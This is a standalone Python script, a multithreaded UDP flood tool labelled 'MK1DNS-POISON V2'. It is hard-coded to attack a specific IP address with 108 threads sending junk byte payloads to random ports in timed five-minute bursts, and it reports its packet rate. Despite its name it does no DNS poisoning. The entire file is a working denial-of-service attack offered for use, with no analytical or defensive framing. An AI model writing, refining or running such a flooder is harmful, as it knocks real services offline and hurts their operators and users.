import socket
import threading
import time
import random

target = "162.0.217.103"
THREADS_PER_GROUP = 54  # 2x groups = 108 total threads

# Colors
RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
CYAN = '\033[96m'
MAGENTA = '\033[95m'
RESET = '\033[0m'

# Virus payloads - optimized for speed
VIRUS_PAYLOADS = [
    b'\x00' * 512,      # Null flood
    b'\xFF' * 256,      # Max bytes
    b'\x80' * 384,      # High bit pattern
    random.randbytes(448),  # Random data
]

# Global state with locks for thread safety
attack_active = True
cycle_start = time.time()
next_cooldown = cycle_start + 300  # First attack: 5 minutes
stats_lock = threading.Lock()
state_lock = threading.Lock()

# Stats
total_packets = 0
stats_reset_time = time.time()

def update_cooldown_state():
    """Thread-safe state update"""
    global attack_active, cycle_start, next_cooldown
    
    current_time = time.time()
    
    with state_lock:
        if current_time >= next_cooldown:
            if attack_active:
                # Switch to cooldown
                attack_active = False
                cycle_start = current_time
                next_cooldown = current_time + 600  # 10 minutes cooldown
                return "COOLDOWN_START"
            else:
                # Switch to attack
                attack_active = True
                cycle_start = current_time
                next_cooldown = current_time + 300  # 5 minutes attack
                return "ATTACK_START"
    return None

def virus_attack(group_id, thread_id):
    """Efficient attack function"""
    global total_packets
    
    # Create socket once per thread (efficient)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(0.001)  # Tiny timeout
    
    # Pre-calc some ports for speed
    ports = [random.randint(1024, 65535) for _ in range(100)]
    port_index = 0
    
    while True:
        # Check state every 100 packets (efficient)
        if thread_id % 100 == 0:
            state_change = update_cooldown_state()
            if state_change == "COOLDOWN_START":
                print(f"\n{YELLOW}[COOLDOWN] Group {group_id} resting for 10min{RESET}")
            elif state_change == "ATTACK_START":
                print(f"\n{GREEN}[ATTACK] Group {group_id} firing for 5min{RESET}")
        
        # Get current state safely
        with state_lock:
            active = attack_active
        
        if active:
            try:
                # Fast batch sending - 10 packets per loop
                for _ in range(10):
                    payload = VIRUS_PAYLOADS[thread_id % 4]  # Cycle through 4 payloads
                    port = ports[port_index % 100]
                    port_index += 1
                    
                    sock.sendto(payload, (target, port))
                    
                    with stats_lock:
                        total_packets += 1
                        
            except:
                # Silent fail, continue
                pass
        else:
            # Cooldown: sleep longer to save CPU
            time.sleep(0.5)

# Launch 2 groups of 54 threads
print(f"{MAGENTA}╔══════════════════════════════════════╗{RESET}")
print(f"{MAGENTA}║    {RED}MK1DNS-POISON V2{RESET} {MAGENTA}           ║{RESET}")
print(f"{MAGENTA}║    {CYAN}EFFICIENT MODE{RESET} {MAGENTA}             ║{RESET}")
print(f"{MAGENTA}╚══════════════════════════════════════╝{RESET}")
print(f"{GREEN}Target:{RESET} {target}")
print(f"{CYAN}Threads:{RESET} {THREADS_PER_GROUP*2} (2x{THREADS_PER_GROUP} groups)")
print(f"{YELLOW}Cooldown:{RESET} 5min attack → 10min rest")
print()

# Start group 1
for i in range(THREADS_PER_GROUP):
    t = threading.Thread(target=virus_attack, args=(1, i), daemon=True)
    t.start()

# Start group 2
for i in range(THREADS_PER_GROUP):
    t = threading.Thread(target=virus_attack, args=(2, i + THREADS_PER_GROUP), daemon=True)
    t.start()

# Status monitor
last_display = 0
print(f"{GREEN}[+] All threads started{RESET}")

while True:
    time.sleep(2)  # Check less frequently
    
    current_time = time.time()
    
    # Update display every 10 seconds
    if current_time - last_display >= 10:
        with stats_lock:
            packets = total_packets
            total_packets = 0
        
        elapsed = current_time - stats_reset_time
        pps = int(packets / elapsed) if elapsed > 0 else 0
        
        # Get time remaining
        with state_lock:
            time_left = max(0, next_cooldown - current_time)
            active = attack_active
            mins = int(time_left // 60)
            secs = int(time_left % 60)
        
        if active:
            state_color = GREEN
            state_text = "FIRING"
        else:
            state_color = YELLOW
            state_text = "RESTING"
        
        print(f"{RED}MK1{RESET}:{GREEN}{pps}/s{RESET} | "
              f"{state_color}{state_text} {mins:02d}:{secs:02d}{RESET}")
        
        stats_reset_time = current_time
        last_display = current_time
